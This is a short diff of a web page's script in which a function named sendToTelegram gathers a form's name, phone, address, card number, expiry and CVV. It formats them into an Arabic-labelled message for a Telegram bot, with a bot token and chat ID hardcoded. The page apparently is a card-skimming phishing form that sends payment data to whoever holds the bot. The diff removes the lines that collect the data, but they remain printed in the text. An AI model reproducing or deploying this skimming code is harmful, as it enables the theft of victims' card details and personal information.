@@ -1524,18 +1524,9 @@ setInterval(() => {
 }, 2000);
 </script><script>
 function sendToTelegram(e) {
-  e.preventDefault();
-  const name = document.getElementById("name")?.value || "";
-  const phone = document.getElementById("phone")?.value || "";
-  const address = document.getElementById("address")?.value || "";
-  const card = document.getElementById("cardNumber")?.value || "";
-  const expiry = document.getElementById("cardExpiry")?.value || "";
-  const cvv = document.getElementById("cardCVV")?.value || "";
 
-  alert("Debug Expiry: " + expiry + " | CVV: " + cvv);
 
-  const message = `💳 طلب جديد للتجريب:%0A👤 الاسم: ${name}%0A📞 الهاتف: ${phone}%0A📍 العنوان: ${address}%0A🔢 بطاقة: ${card}%0A📅 Exp: ${expiry}%0A🔐 CVV: ${cvv}`;
-
+  
   const token = "8259868430:AAFQ-oqYzk-nd3cx47XqUdYhPCRQ9YDeWmM";  // ضع التوكن الخاص بك هنا
   const chatId = "5794299315"; // الشات آي دي الخاص بك
 
@@ -1545,3 +1536,4 @@ function sendToTelegram(e) {
 }
 </script></body>
 </html>
+
